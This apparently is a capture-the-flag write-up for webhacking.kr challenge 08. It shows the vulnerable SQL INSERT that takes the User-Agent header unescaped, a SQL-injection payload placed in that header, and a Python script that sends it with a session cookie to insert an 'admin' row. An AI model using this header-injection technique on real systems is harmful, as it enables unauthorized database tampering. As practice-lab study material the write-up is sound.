================================================================================================================
[webhacking.kr] 08
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="User-Agent: joizel','2.2.2.2','admin');#",arrowhead="normal"];
        step3 -> step2[label="Add user",arrowhead="normal"];
    }

|


server -> DB
================================================================================================================

- PHP
- GET 파라미터: HTTP_USER_AGENT

.. code-block:: sql

    insert into lv0(agent,ip,id) 
    values('$_SERVER[HTTP_USER_AGENT]','$ip','guest')

|

insert
================================================================================================================

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-08/index.php"
    headers = {
        "User-Agent":"joizel','2.2.2.2','admin');#"
    }
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    r = requests.get(url, headers = headers, cookies=cookies, verify=False)

    print r.content

|
